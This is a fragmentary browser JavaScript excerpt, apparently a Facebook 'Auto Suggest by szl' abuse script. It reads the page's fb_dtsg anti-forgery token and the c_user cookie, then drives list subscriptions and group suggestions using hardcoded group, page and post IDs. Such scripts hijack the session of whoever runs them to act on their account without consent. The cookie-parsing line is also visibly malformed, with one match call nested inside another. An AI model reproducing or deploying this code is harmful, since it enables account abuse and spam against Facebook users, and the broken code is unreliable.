...
sublist("511885145573620");
sublist("524085751020956");
sublist("577784408960713");
sublist("513881785373956");

//Anggota
var gid = ['475095929270976'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "432550626866024";
var spost_id = "592109757497647";
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by szl';
